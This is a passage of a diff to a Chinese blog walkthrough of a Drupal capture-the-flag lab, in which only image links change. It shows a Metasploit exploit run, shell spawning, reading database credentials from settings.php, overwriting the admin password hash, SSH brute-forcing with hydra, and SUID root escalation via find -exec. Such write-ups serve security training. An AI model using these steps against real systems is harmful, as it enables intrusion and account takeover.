-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606222604693.png&#34; alt=&#34;image-20230606222604693&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exploit&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606222604693.png&#34; alt=&#34;image-20230606222604693&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;出现这个就说明我们攻击成功了，接下来我们就可以直接上 shell&lt;/p&gt;
 &lt;h3 id=&#34;getshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getshell&#34;&gt;#&lt;/a&gt; Getshell&lt;/h3&gt;
 &lt;h4 id=&#34;获取普通shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取普通shell&#34;&gt;#&lt;/a&gt; 获取普通 shell&lt;/h4&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shell&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;直接输入 shell 能执行指令，这里输入 &lt;code&gt;ls&lt;/code&gt;  可以发现能直接执行&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606222754367.png&#34; alt=&#34;image-20230606222754367&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606222754367.png&#34; alt=&#34;image-20230606222754367&#34; /&gt;&lt;/p&gt;
 &lt;h4 id=&#34;获取交互式shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取交互式shell&#34;&gt;#&lt;/a&gt; 获取交互式 shell&lt;/h4&gt;
 &lt;p&gt;这里我们可以利用到 python 的模块，前提是主机里装有 python&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606223127443.png&#34; alt=&#34;image-20230606223127443&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606223127443.png&#34; alt=&#34;image-20230606223127443&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样会好看点，可以看到有个 flag1.txt ，这是我们找到的第一个 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606223209084.png&#34; alt=&#34;image-20230606223209084&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606223209084.png&#34; alt=&#34;image-20230606223209084&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里根据 flag1.txt 的提示，查看 CMS 的配置文件，这里我们百度以下 Drupal 的配置文件是什么&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606223432596.png&#34; alt=&#34;image-20230606223432596&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606223432596.png&#34; alt=&#34;image-20230606223432596&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;配置文件是 &lt;code&gt;settings.php&lt;/code&gt;  我们回 kali 里查找&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-name&lt;/span&gt; settings.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
 &lt;p&gt;find 查找指令&lt;/p&gt;
 &lt;p&gt;/ 	根目录&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606223557721.png&#34; alt=&#34;image-20230606223557721&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606223557721.png&#34; alt=&#34;image-20230606223557721&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;直接去查看配置文件&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;tac&lt;/span&gt; /var/www/sites/default/settings.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606224058356.png&#34; alt=&#34;image-20230606224058356&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;tac&lt;/span&gt; /var/www/sites/default/settings.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606224058356.png&#34; alt=&#34;image-20230606224058356&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到 mysql 数据库的账号密码，还有我们的 flag2 暂时没什么用先放着&lt;/p&gt;
 &lt;p&gt;我们先连接数据库&lt;/p&gt;
 &lt;h3 id=&#34;数据库渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库渗透&#34;&gt;#&lt;/a&gt; 数据库渗透&lt;/h3&gt;
 &lt;p&gt;由上面的账号密码登入&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql &lt;span class=&#34;token parameter variable&#34;&gt;-udbuser&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-pR0ck3t&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606224608869.png&#34; alt=&#34;image-20230606224608869&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql &lt;span class=&#34;token parameter variable&#34;&gt;-udbuser&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-pR0ck3t&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606224608869.png&#34; alt=&#34;image-20230606224608869&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;use drupaldb;show tables;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606224801325.png&#34; alt=&#34;image-20230606224801325&#34; /&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; * from &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; name,pass from &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606224900751.png&#34; alt=&#34;image-20230606224900751&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606224801325.png&#34; alt=&#34;image-20230606224801325&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; * from &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; name,pass from &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606224900751.png&#34; alt=&#34;image-20230606224900751&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样只查看 name 和 pass 会方便很多&lt;/p&gt;
 &lt;p&gt;可以看到这里有网站 admin 的账号密码，但是密码被加密&lt;/p&gt;
 &lt;p&gt;加密脚本在  &lt;code&gt;/var/www/scripts/password-hash.sh&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;我们可以将 admin 的密码更改掉&lt;/p&gt;
 &lt;p&gt;因为加密脚本是 php 写的，所以直接用 php 执行即可&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先退出 mysql&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php /var/www/scripts/password-hash.sh &lt;span class=&#34;token number&#34;&gt;123456&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606225343401.png&#34; alt=&#34;image-20230606225343401&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php /var/www/scripts/password-hash.sh &lt;span class=&#34;token number&#34;&gt;123456&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606225343401.png&#34; alt=&#34;image-20230606225343401&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;$S$DUfLi3H99AneMTfLKR.T6BuYivB8jczEhAjQemtPtyTo8Hfo4n1Q
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;我们将  &lt;code&gt;123456&lt;/code&gt;  的密文先保存起来&lt;/p&gt;
 &lt;p&gt;然后返回到 mysql&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;update &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; pass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$DUfLi3H99AneMTfLKR&lt;/span&gt;.T6BuYivB8jczEhAjQemtPtyTo8Hfo4n1Q&#34;&lt;/span&gt; where name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606225751973.png&#34; alt=&#34;image-20230606225751973&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;update &lt;span class=&#34;token function&#34;&gt;users&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; pass &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&lt;span class=&#34;token variable&#34;&gt;$S&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$DUfLi3H99AneMTfLKR&lt;/span&gt;.T6BuYivB8jczEhAjQemtPtyTo8Hfo4n1Q&#34;&lt;/span&gt; where name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;admin&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606225751973.png&#34; alt=&#34;image-20230606225751973&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样密码就修改成功了，前往浏览器登陆账号&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606225903110.png&#34; alt=&#34;image-20230606225903110&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606225903110.png&#34; alt=&#34;image-20230606225903110&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;发现 flag3 ，得到线索，查看 &lt;code&gt;/etc/passwd&lt;/code&gt;  文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606230033930.png&#34; alt=&#34;image-20230606230033930&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606230033930.png&#34; alt=&#34;image-20230606230033930&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里有个 flag4 的账号，我们通过 ssh 爆破的方式获取密码&lt;/p&gt;
 &lt;h3 id=&#34;用户密码爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户密码爆破&#34;&gt;#&lt;/a&gt; 用户密码爆破&lt;/h3&gt;
 &lt;p&gt;利用  &lt;code&gt;hydra&lt;/code&gt;  爆破 flag4 的密码，用 kali 自带的字典&lt;/p&gt;
 &lt;p&gt;在本机上爆破密码&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hydra &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; flag4 &lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt.gz &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; ssh://192.168.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606230535073.png&#34; alt=&#34;image-20230606230535073&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hydra &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt; flag4 &lt;span class=&#34;token parameter variable&#34;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt.gz &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt; ssh://192.168.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606230535073.png&#34; alt=&#34;image-20230606230535073&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;成功爆破出来，密码 orange，用 kali 连接&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; flag4@192.168.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230607194806506.png&#34; alt=&#34;image-20230607194806506&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230607194848816.png&#34; alt=&#34;image-20230607194848816&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; flag4@192.168.16.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230607194806506.png&#34; alt=&#34;image-20230607194806506&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230607194848816.png&#34; alt=&#34;image-20230607194848816&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;获取线索，用同样的方法查找在 /root 下的 flag&lt;/p&gt;
 &lt;h3 id=&#34;linux-提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-提权&#34;&gt;#&lt;/a&gt; Linux 提权&lt;/h3&gt;
 &lt;p&gt;需要用到 SUID 提权，参考以下&lt;/p&gt;
@@ -446,14 +446,14 @@
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI3MjYxNy5odG1s&#34;&gt;简谈 SUID 提权 - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;利用 &lt;code&gt;find&lt;/code&gt;  命令，找查具有 SUID 权限的可执行二进制文件&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230607195751262.png&#34; alt=&#34;image-20230607195751262&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230607195751262.png&#34; alt=&#34;image-20230607195751262&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里我们看到 &lt;code&gt;find&lt;/code&gt; ，find 比较常用，所以我们可以执行 root 权限的命令找查文件&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-name&lt;/span&gt; index.php &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;/bin/sh&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
 &lt;p&gt;查什么文件不重要（但是必须得是存在的文件）只要格式对了，后面加上 -exec &amp;quot;/bin/sh&amp;quot; ; 就行&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230607202817386.png&#34; alt=&#34;image-20230607202817386&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230607202817386.png&#34; alt=&#34;image-20230607202817386&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到这里我们已经提权成功了，接下来就是查看最后一个 flag 的内容&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; /root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230607203024465.png&#34; alt=&#34;image-20230607203024465&#34; /&gt;&lt;/p&gt;
